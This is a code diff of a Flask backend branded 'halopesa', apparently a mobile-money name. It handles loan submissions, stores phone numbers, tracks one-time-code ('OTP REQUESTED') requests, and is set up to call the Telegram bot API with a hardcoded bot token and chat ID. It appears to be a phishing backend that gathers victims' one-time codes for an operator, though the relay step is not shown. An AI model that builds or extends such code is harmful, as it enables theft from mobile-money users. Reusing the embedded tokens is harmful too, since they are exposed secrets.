@@ -10,19 +10,18 @@ import logging
 app = Flask(__name__)
 app.secret_key = 'halopesa-new-2024'
 
-# ============================================
-# 🔐 Get credentials from environment variables
-# ============================================
+# ================================
+# 🔐 Get credentials from environment variables (Render)
+# ================================
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
 CHAT_ID   = os.environ.get('CHAT_ID')
 
-# Fallback – only for local testing (remove when deployed)
+# Fallback for local testing (use your new token here)
 if not BOT_TOKEN:
-    BOT_TOKEN = '8204438021:AAHz1pTtUqIW4OP_Fq-MOAw9fCnhKCWEQkA'  # old token – replace!
+    BOT_TOKEN = '8892736098:AAEtdKvOXalb0Gc_3kAlSRWvdMqIhS3aAgw'
 if not CHAT_ID:
     CHAT_ID = '8589275340'
 
-# Set up logging
 logging.basicConfig(level=logging.INFO)
 
 TELEGRAM_API = f'https://api.telegram.org/bot{BOT_TOKEN}'
@@ -51,7 +50,7 @@ def init_db():
     )''')
     conn.commit()
     conn.close()
-    logging.info("Database initialized with all columns.")
+    logging.info("Database initialized.")
 
 init_db()
 
@@ -110,6 +109,7 @@ def submit_loan():
         conn = sqlite3.connect('database.db')
         c = conn.cursor()
 
+        # OTP REQUESTED (for resend)
         if purpose == 'OTP REQUESTED':
             c.execute("SELECT COUNT(*) FROM loans WHERE phone=? AND status='pending' AND code_status='pending'", (phone,))
             if c.fetchone()[0] >= 3:
